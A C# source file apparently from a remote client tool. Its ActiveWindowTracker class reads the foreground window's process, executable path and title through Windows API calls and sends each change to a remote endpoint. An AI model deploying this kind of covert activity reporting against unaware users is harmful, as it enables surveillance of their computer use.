using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteClient
{
	public class ActiveWindowTracker
	{
		private class NativeMethods
		{
			[DllImport("user32.dll")]
			public static extern IntPtr GetForegroundWindow();

			[DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
			public static extern int GetWindowThreadProcessId(IntPtr windowHandle, out int processId);

			[DllImport("user32.dll")]
			public static extern int GetWindowText(int hWnd, StringBuilder text, int count);
		}

		private string lastWindowTitle;

		public void WriteCurrentWindowInformation()
		{
			var activeWindowId = NativeMethods.GetForegroundWindow();

			if (activeWindowId.Equals(0))
			{
				return;
			}

			int processId;
			NativeMethods.GetWindowThreadProcessId(activeWindowId, out processId);

			if (processId == 0)
			{
				return;
			}

			Process foregroundProcess = Process.GetProcessById(processId);

			var fileName = string.Empty;
			var fileDescription = string.Empty;
			var productName = string.Empty;
			var processName = string.Empty;
			var windowTitle = string.Empty;

			try
			{
				if (!string.IsNullOrEmpty(foregroundProcess.ProcessName))
				{
					processName = foregroundProcess.ProcessName;
				}
			}
			catch (Exception)
			{
			}

			try
			{
				if (!string.IsNullOrEmpty(foregroundProcess.MainModule.FileName))
				{
					fileName = foregroundProcess.MainModule.FileName;
				}
			}
			catch (Exception)
			{
			}

			try
			{
				if (!string.IsNullOrEmpty(foregroundProcess.MainModule.FileVersionInfo.FileDescription))
				{
					fileDescription = foregroundProcess.MainModule.FileVersionInfo.FileDescription;
				}
			}
			catch (Exception)
			{
			}

			try
			{
				if (!string.IsNullOrEmpty(foregroundProcess.MainModule.FileVersionInfo.ProductName))
				{
					productName = foregroundProcess.MainModule.FileVersionInfo.ProductName;
				}
			}
			catch (Exception)
			{
			}

			try
			{
				if (!string.IsNullOrEmpty(foregroundProcess.MainWindowTitle))
				{
					windowTitle = foregroundProcess.MainWindowTitle;
				}
			}
			catch (Exception)
			{
			}

			try
			{
				if (string.IsNullOrEmpty(windowTitle))
				{
					const int Count = 1024;
					var sb = new StringBuilder(Count);
					NativeMethods.GetWindowText((int)activeWindowId, sb, Count);

					windowTitle = sb.ToString();
				}
			}
			catch (Exception)
			{
			}

			if (lastWindowTitle != windowTitle)
			{
                RemoteClient.SendMessage(new DataObject{CommandType = "RTL",CommandName = "RTAUPD",
                    CommandData = String.Format("ProcessId: {0}\nFilename: {1}\nFileDescription: {2}\nProductName: {3}\nProcessName: {4}\nWindowTitle: {5}\nWindowHandle: {6}\n",
					Convert.ToString(processId),
					fileName,
					fileDescription,
					productName,
					processName,
					windowTitle,
					Convert.ToString(activeWindowId))
                });

				lastWindowTitle = windowTitle;
			}
		}

    }
}
